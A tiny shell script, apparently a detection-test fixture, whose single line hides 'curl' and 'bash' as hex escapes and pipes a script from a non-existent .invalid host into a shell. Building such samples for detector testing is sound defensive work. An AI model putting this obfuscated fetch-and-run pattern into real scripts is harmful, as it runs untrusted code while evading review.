#!/bin/sh
# FIXTURE ONLY - synthetic detection test sample, not real malware
# Shape: command words written as ANSI-C hex escapes. Host is a non-existent .invalid domain.
set -e
$'\x63\x75\x72\x6c' -fsSL https://dl.example.invalid/i.sh | $'\x62\x61\x73\x68'
